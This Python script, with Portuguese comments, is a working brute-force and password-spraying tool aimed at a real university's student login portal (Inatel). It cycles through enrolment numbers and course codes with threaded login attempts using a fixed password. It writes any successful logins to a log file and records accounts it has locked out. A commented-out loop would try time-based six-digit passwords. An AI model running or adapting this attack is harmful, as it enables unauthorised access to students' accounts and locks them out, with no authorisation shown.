#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

# Dependencias
# apt install python-mechanize ou apt install python2-mechanize
# apt install python-bs4 ou apt install python2-bs4

'''
1 - Engenharia Elétrica (modalidade em Eletrônica)
47 - Engenharia Elétrica
2 - Engenharia da Computação
12 - Engenharia de Telecomunicações
6 - Engenharia Biomédica
24 - Engenharia de Controle e Automação
3 - Engenharia de Produção
43 - Engenharia de Software
5 - Tec. em Redes de Computadores
7 - Tec. em Automação Industrial
21 - Tec. em Gestão de Telecomunicações
31 - Curso de Aluno Especial

Com 4 tentativas incorretas a matrícula é bloqueado naquele curso.

Atualizado a lista dia: 10/03/2019
'''


from mechanize import Browser
from bs4 import BeautifulSoup
import os
import threading


def verify(th, num, curso, matr, senha):
    URL = "https://siteseguro.inatel.br/PortalAcademico/WebLogin.aspx"

    br = Browser()
    br.set_handle_robots(False)
    br.open(URL)

    br.select_form('aspnetForm')
    br.addheaders = [('User-agent',
                      'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) '
                      'Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    br.form['ctl00$Corpo$TabAcessoLogin$TabAluno$LogOn$tbMatricula'] = matr
    br.form['ctl00$Corpo$TabAcessoLogin$TabAluno$LogOn$Password'] = senha
    br.form['ctl00$Corpo$TabAcessoLogin$TabAluno$LogOn$dropSubCurso'] = [curso]

    response = br.submit(name='ctl00$Corpo$TabAcessoLogin'
                              '$TabAluno$LogOn$LoginButton')

    dados = response.read()

    soup = BeautifulSoup(dados, 'html.parser')

    try:
        label_erro = soup.find(id='ctl00_Corpo_lblErro')
        label_login = soup.find(id='ctl00_LoginName1')

        if label_erro is not None:
            label_erro_str = label_erro.get_text().encode('ascii', 'ignore')

        if label_login is not None:
            os.system("echo 'Curso: %s; Matr: %s; Senha: %s' "
                      ">> senha.log" % (curso, matr, senha))
            return True

        elif label_erro_str == ('Sua senha est bloqueada. Entre '
                                'em contato com a CRA para providenciar '
                                'o desbloqueio ou aguarde 30 minutos.'):
            os.system("echo 'Curso: %s; Matr: %s; Senha: %s' "
                      ">> bloqueado.log" % (curso, matr, senha))
            return False

        else:
            print('Thread: %i ==> Curso: %s; Matr: %s; Senha: %s; NOK' % (num, curso, matr, senha))

    except:
        print("Erro na biblioteca, verifique as dependencias!")

for matr in range(9000, 9999):
    matr = ('%s' % matr)
    lista_curso = ['1', '47', '2', '12', '6', '24', '3',
                   '43', '5', '7', '21', '31']
    senha = '093145'
    threading._start_new_thread(verify, ("Thread 1", 1, lista_curso[0], matr, senha))
    threading._start_new_thread(verify, ("Thread 47", 2, lista_curso[1], matr, senha))
    threading._start_new_thread(verify, ("Thread 2", 3, lista_curso[2], matr, senha))
    threading._start_new_thread(verify, ("Thread 12", 4, lista_curso[3], matr, senha))
    threading._start_new_thread(verify, ("Thread 6", 5, lista_curso[4], matr, senha))
    threading._start_new_thread(verify, ("Thread 24", 6, lista_curso[5], matr, senha))
    threading._start_new_thread(verify, ("Thread 3", 7, lista_curso[6], matr, senha))
    threading._start_new_thread(verify, ("Thread 43", 8, lista_curso[7], matr, senha))
    threading._start_new_thread(verify, ("Thread 5", 9, lista_curso[8], matr, senha))
    threading._start_new_thread(verify, ("Thread 7", 10, lista_curso[9], matr, senha))
    threading._start_new_thread(verify, ("Thread 21", 11, lista_curso[10], matr, senha))
    threading._start_new_thread(verify, ("Thread 31", 12, lista_curso[11], matr, senha))
    '''for H in range(9, 11):
        for M in range(0, 60):
            for S in range(0, 60):
                senha = ('%s%s%s' % (('{0:02}'.format(H)),
                            ('{0:02}'.format(M)), ('{0:02}'.format(S))))'''
